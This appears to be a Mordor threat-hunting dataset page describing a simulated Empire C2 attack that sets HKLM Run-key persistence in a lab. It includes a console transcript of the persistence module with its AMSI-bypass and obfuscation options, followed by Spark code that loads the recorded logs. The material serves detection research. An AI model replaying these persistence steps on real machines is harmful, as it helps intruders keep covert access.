# Empire Elevated Registry

## Metadata


|                   |    |
|:------------------|:---|
| id                | SDWIN-190518183936 |
| author            | Roberto Rodriguez @Cyb3rWard0g |
| creation date     | 2019/05/18 |
| platform          | Windows |
| Mordor Environment| Mordor shire |
| Simulation Type   | C2 |
| Simulation Tool   | Empire |
| Simulation Script | https://github.com/EmpireProject/Empire/blob/dev/data/module_source/persistence/Persistence.psm1 |
| Dataset           | https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/persistence/empire_elevated_registry.zip |
| References        | None |

## Dataset Description
This dataset represents adversaries modifying HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion\Run registry keys for persistence.

## Adversary View
```
(Empire: 712ETU3B) > agents
[*] Active agents:

Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener
----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------
712ETU3B ps 172.18.39.5     WORKSTATION5      *MORDOR\pgustavo        powershell         9076   5/0.0    2020-07-22 04:06:31  http            

(Empire: agents) > 
(Empire: agents) > interact 712ETU3B
(Empire: 712ETU3B) > 
(Empire: 712ETU3B) > usemodule persistence/elevated/registry*

(Empire: 712ETU3B) > usemodule persistence/elevated/registry*
(Empire: powershell/persistence/elevated/registry) > info

              Name: Invoke-Registry
            Module: powershell/persistence/elevated/registry
        NeedsAdmin: True
        OpsecSafe: False
          Language: powershell
MinLanguageVersion: 2
        Background: False
  OutputExtension: None

Authors:
  @mattifestation
  @harmj0y

Description:
  Persist a stager (or script) via the
  HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion\Run registry
  key. This has an easy detection/removal rating.

Comments:
  https://github.com/mattifestation/PowerSploit/blob/master/Pe
  rsistence/Persistence.psm1

Options:

  Name             Required    Value                     Description
  ----             --------    -------                   -----------
  Agent            True        712ETU3B                  Agent to run module on.                 
  Listener         False                                 Listener to use.                        
  Obfuscate        False       False                     Switch. Obfuscate the launcher          
                                                        powershell code, uses the               
                                                        ObfuscateCommand for obfuscation types. 
                                                        For powershell only.                    
  ObfuscateCommand False       Token\All\1               The Invoke-Obfuscation command to use.  
                                                        Only used if Obfuscate switch is True.  
                                                        For powershell only.                    
  AMSIBypass       False       True                      Include mattifestation's AMSI Bypass in 
                                                        the stager code.                        
  AMSIBypass2      False       False                     Include Tal Liberman's AMSI Bypass in   
                                                        the stager code.                        
  KeyName          True        Updater                   Key name for the run trigger.           
  RegPath          False       HKLM:SOFTWARE\Microsoft\  Registry location to store the script   
                              Windows\CurrentVersion\D  code. Last element is the key name.     
                              ebug                    
  ADSPath          False                                 Alternate-data-stream location to store 
                                                        the script code.                        
  ExtFile          False                                 Use an external file for the payload    
                                                        instead of a stager.                    
  Cleanup          False                                 Switch. Cleanup the trigger and any     
                                                        script from specified location.         
  UserAgent        False       default                   User-agent string to use for the staging
                                                        request (default, none, or other).      
  Proxy            False       default                   Proxy to use for request (default, none,
                                                        or other).                              
  ProxyCreds       False       default                   Proxy credentials                       
                                                        ([domain\]username:password) to use for 
                                                        request (default, none, or other).      

(Empire: powershell/persistence/elevated/registry) > set Listener http
(Empire: powershell/persistence/elevated/registry) > execute
[>] Module is not opsec safe, run? [y/N] y
[*] Tasked 712ETU3B to run TASK_CMD_WAIT
[*] Agent 712ETU3B tasked with task ID 7
[*] Tasked agent 712ETU3B to run module powershell/persistence/elevated/registry
(Empire: powershell/persistence/elevated/registry) > 
Registry persistence established using listener http stored in HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion\Debug.

(Empire: powershell/persistence/elevated/registry) >
```

## Explore Mordor Dataset

### Initialize Analytics Engine

from openhunt.mordorutils import *
spark = get_spark()

### Download & Process Mordor File

mordor_file = "https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/persistence/empire_elevated_registry.zip"
registerMordorSQLTable(spark, mordor_file, "mordorTable")

### Get to know your data

df = spark.sql(
    '''
SELECT *
FROM mordorTable
    '''
)
df.printSchema()
        